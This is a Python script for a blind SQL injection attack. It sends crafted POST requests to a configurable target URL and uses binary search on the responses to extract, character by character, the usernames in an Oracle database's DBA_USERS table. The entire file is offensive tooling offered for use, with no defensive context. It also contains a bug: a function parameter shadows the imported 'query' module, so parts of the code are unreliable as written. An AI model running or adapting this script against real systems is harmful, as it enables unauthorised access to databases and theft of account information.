from requests import post
import query
from sys import exit

### VAL AREA
targetURL = query.get_val("targetURL")
headers = query.get_val("headers")
cookies = query.get_val("cookies")
data = query.get_val("data")


### FUNCTION AREA
def check_query(query, mid):
    data["keyword"] = query + str(mid)
    r = post(targetURL, headers=headers, cookies=cookies, data=data)

    if query.get_val("targetString") in r.text:
        return True
    else:
        return False


def binary_search(low, high, query):
    result = None  # answer value
    while low <= high:
        mid = (low + high) // 2
        if check_query(query, mid):
            # query is over mid
            low = mid + 1
        else:
            # mid found, narrow down searching
            result = mid
            high = mid - 1
    return result


def send_SQL(column, table):
    result = {}

    countQuery = query.get_count(column, table)
    nameCountMAX = binary_search(0, 100, countQuery)
    print(f"{nameCountMAX} names here")

    for num in range(1, nameCountMAX + 1):
        name = ""

        indexQuery = query.get_index(column, table).format(num)
        nameIndexMAX = binary_search(1, 30, indexQuery)
        print(f"{num} user name: {nameIndexMAX} characters")

        for index in range(1, nameIndexMAX + 1):
            dataQuery = query.get_data(column, table).format(index, num)
            nameChr = chr(binary_search(32, 126, dataQuery))
            print(nameChr)
            name = name + nameChr

        result[str(num)] = name
        print(f"{num}:{name} Done.")

    return result


if __name__ == "__main__":
    send_SQL("USERNAME", "DBA_USERS")
